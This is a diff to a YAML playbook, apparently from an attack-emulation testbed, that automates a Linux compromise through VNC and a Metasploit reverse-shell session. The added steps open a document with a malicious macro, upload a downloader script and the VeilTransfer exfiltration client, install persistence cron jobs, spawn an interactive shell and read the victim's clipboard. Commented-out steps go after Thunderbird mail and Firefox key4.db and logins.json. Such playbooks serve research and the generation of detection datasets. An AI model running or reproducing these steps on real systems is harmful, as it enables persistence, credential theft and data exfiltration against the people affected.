@@ -96,6 +96,24 @@ commands:
   - type: sleep
     seconds: 3
 
+# copy something to the clipboard
+  - type: vnc 
+    cmd: type 
+    input: echo 'Dummy Text' | xclip -selection clipboard
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+  - type: vnc
+    cmd: key
+    key: "enter"
+    session: client
+
+  - type: sleep
+    seconds: 3
+
+# Open the Document with the malicious macro
   - type: vnc 
     cmd: type 
     input: "soffice /home/judy/Nutzungshinweise.odt"
@@ -118,24 +136,120 @@ commands:
 
 ################### PERSISTENCE OPTION A, CRON JOB ############################
 
-  # create cron job
+ # upload cronjob
   - type: msf-session
     session: revshell
-    cmd: execute -f /bin/bash -a "-c '(crontab -l 2>/dev/null; echo \"*/5 * * * * /bin/bash -c \'/tmp/index &\'\") | crontab -'"
+    cmd: upload crontab.txt
+
+ # upload cronjob
+  - type: msf-session
+    session: revshell
+    cmd: upload downloader.txt
+
+
+ # upload veiltransfer-client
+  - type: msf-session
+    session: revshell
+    cmd: upload /home/aecid/VeilTransfer/veiltransfer_client_linux /home/judy/.local/bin
 
 
 ################### ATTACKER GATHERS INFORMATION ############################
-## TODO
+
+ # download Emails
+ # - type: msf-session
+ #   session: revshell
+ #   cmd: download /home/judy/.thunderbird/user.default-release/Mail/'Local Folders'/Inbox
+
+ # get interactive shell
+  - type: msf-session
+    cmd: shell
+    session: revshell
+
+  - type: msf-session
+    cmd: python3 -c "import pty;pty.spawn(\"/bin/bash\")";
+    session: revshell
+ 
+  - type: msf-session
+    cmd: export SHELL=bash
+    session: revshell
+ 
+  - type: msf-session
+    cmd: export TERM=xterm256-color
+    session: revshell
+
+  - type: msf-session
+    cmd: stty rows 38 columns 116
+    session: revshell
+
+  - type: msf-session
+    cmd: export DISPLAY=:0
+    session: revshell
+
+  - type: msf-session
+    cmd: export PROFILE=$(basename /home/judy/.mozilla/firefox/*.dev-edition-default | cut -d"." -f1)
+    session: revshell
+
+  - type: msf-session
+    cmd: echo $PROFILE
+    session: revshell
+
+#  - type: setvar
+#    cmd: $RESULT_STDOUT
+#    variable: FIREFOXPROFILE
+#
+#  - type: debug
+#    cmd: firefox profile $FIREFOXPROFILE
+ 
+ 
+
+
+# make the veiltransfer client binary executable
+  - type: msf-session
+    session: revshell
+    cmd: chmod +x /home/judy/.local/bin/veiltransfer_client_linux && sleep 5
+
+  # add the persistence cronjob
+  - type: msf-session
+    session: revshell
+    cmd: crontab /home/judy/crontab.txt
+
+  # get the last clipboard entry
+  - type: msf-session
+    session: revshell
+    cmd: xclip -selection clipboard -o
+
+  # add the cronjob to extract data
+  - type: msf-session
+    session: revshell
+    cmd: (crontab -l; cat /home/judy/downloader.txt) | crontab -
+
+#  # send the emails via veiltransfer
 #  - type: msf-session
 #    session: revshell
-#    cmd:
-#
-#  # make it executable
+#    cmd: veiltransfer_client_linux transfer quic -localPath /home/judy/.thunderbird/user.default-release/Mail/'Local Folders'/Inbox
+
+  # exit the interactive shell
+  - type: msf-session
+    session: revshell
+    cmd: exit
+
+# # extract firefox session store
 #  - type: msf-session
 #    session: revshell
-#    cmd:
+#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILE.dev-edition-default/sessionstore-backups/recovery.jsonlz4
 #
-#  # replace the symlink
+# # extract firefox password decryption keys
+#  - type: msf-session
+#    session: revshell
+#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILEPROFILE.dev-edition-default/key4.db
+#
+# # extract firefox passwords
+#  - type: msf-session
+#    session: revshell
+#    cmd: download /home/judy/.mozilla/firefox/$FIREFOXPROFILEPROFILE.dev-edition-default/logins.json
+
+#
+#  # 
 #  - type: msf-session
 #    session: revshell
 #    cmd: 
